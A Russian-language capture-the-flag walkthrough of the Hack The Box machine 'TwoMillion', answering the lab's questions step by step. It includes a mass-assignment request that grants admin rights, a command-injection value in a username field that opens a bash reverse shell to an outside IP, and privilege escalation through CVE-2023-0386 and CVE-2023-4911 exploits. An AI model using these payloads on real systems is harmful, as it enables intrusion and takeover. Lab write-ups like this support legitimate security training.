1 How many TCP ports are open?

При сканировании через nmap было выявлено 2 открытых порта

![[nmap_scan.png]]
ответ: 2

2 What is the name of the JavaScript file loaded by the `/invite` page that has to do with invite codes?

После перехода на сайт `<target-ip>:80` мы попадаем на главную страницу перейдя по пути `http://2million.htb/invite` и открыв консоль разработчика мы видим файл `inviteapi.min.js` 

![[invite_api.png]]
ответ: inviteapi.min.js

3 What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.

Перейдя в файл `inviteapi.min.js` мы видим длинную строку кода после её деобфускации видим следующий JavaScript код

![[deobfucate_jscode.png]]
ответ: makeInviteCode

4 The endpoint in `makeInviteCode` returns encrypted data. That message provides another endpoint to query. That endpoint returns a `code` value that is encoded with what very common binary to text encoding format. What is the name of that encoding?

После того как мы узнали нужный нам `endpoint` запускаем BurpSuite и через `Proxy` перехватываем запрос далее кидаем его в `Repeater` где получаем текст закодированный rot13 раскодировав его получаем строку в base64.

![[generate_code.png]]
![[get_base64_code.png]]
 ответ:base64

5 What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

Раскодировав строку мы получаем пригласительный код после чего регистрируемся и входим в аккаунт далее идём по пути `http://2million.htb/home/access` наводимся на кнопку `Connection Pack` и видим путь до нужного api значения.

![[vpn_api.png]]
ответ: /api/v1/user/vpn/generate

6 How many API endpoints are there under `/api/v1/admin`?

Так же в BurpSuite подменяем путь на  /api/v1 и видим все api сайта

![[api_admin_endpoint.png]]
ответ: 3

7 What API endpoint can change a user account to an admin account?

Используя данный `endpoint` мы получаем роль администратора использовав следующие параметры
```
{
	"email":"test@gmail.com",
	"username":"test",
	"is_admin":1	
}
```

![[api_admin_settings_update.png]]
ответ: /api/v1/admin/settings/update

8 What API endpoint has a command injection vulnerability in it?

Сгенерировав vpn через сайт в имени файла было имя нашего пользователя поэтому мы можем внедрить туда строку для `revershell` после чего отправляем и получили обратный коннект

```
{
	"username":"test; bash -c \"bash -i > /dev/tcp/10.10.14.81/1234 0<&1\" #""
}
```

![[vulnarability_injection.png]]
ответ: /api/v1/admin/vpn/generate

9 What file is commonly used in PHP applications to store environment variable values?

Поискав по системе находим файл `.env`  в котором содержится пароль и логин попробуем его для входа в 22 ssh порт

![[env_file.png]]
ответ: .env

10 Submit the flag located in the admin user's home directory.

После подключения вводим `cat user.txt` и получаем первый флаг

![[userflag.png]]


11 What is the email address of the sender of the email sent to admin?

Далее с помощью команды ищем письма адресованные админу `find / -name "admin" -o name "email" -o -name "mail" -type f 2>/dev/null` и находим одно письмо в директории `/var/mail`
 
![[admin_mail.png|601]]
ответ: `ch4p@2million.htb`

12 What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?

Из этого письма:
```
From: ch4p [ch4p@2million.htb](mailto:ch4p@2million.htb)
To: admin [admin@2million.htb](mailto:admin@2million.htb)
Cc: g0blin [g0blin@2million.htb](mailto:g0blin@2million.htb)
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700 Message-ID: [9876543210@2million.htb](mailto:9876543210@2million.htb) X-Mailer: ThunderMail Pro 5.2

Hey admin,  I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.  HTB Godfather`
```

Мы узнаём что есть некая уязвимость на файловую систему OverlayFS после поиска в интернете натыкаемся на CVE-2023-0386

![[cve_id.png]]
ответ: CVE-2023-0386

13 Submit the flag located in root's home directory.

После чего скачиваем git репозиторий на хост и архивируем директорию с помощью `tar` после архивации  поднимаем python server далее на машине с помощью команды `wget http://<openvpn-ip>:80/CVE-2023-0386.tar.bz2` копируем её и разархивируем `tar -xvf CVE-2023-0386.tar.bz2` далее действуем по инструкции написаной в эксплойте

![[rootflag.png]]


В качестве альтернативы получения root доступа воспользуемся уявзвимостью в Glib она называется "Looney Tunables" `CVE-2023-4911` 

14 [Alternative Priv Esc] What is the version of the GLIBC library on TwoMillion?

Узнаём что glib имеет версию `2.35`

![[ldd_version.png]]
ответ: 2.35

15 [Alternative Priv Esc] What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?

После того как мы нашли версию ещем PoC и известные CVE.

![[cve_id_GLIB.png]]
ответ: CVE-2023-4911

16 [Alternative Priv Esc] With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow? After answering this question, run the POC and get a shell as root.

После этого пробуем PoC и получаем root 
`так как CVE работает не всегда в моём случае он не сработал но у вас она может работать без проблем`

![[denied_root.png]]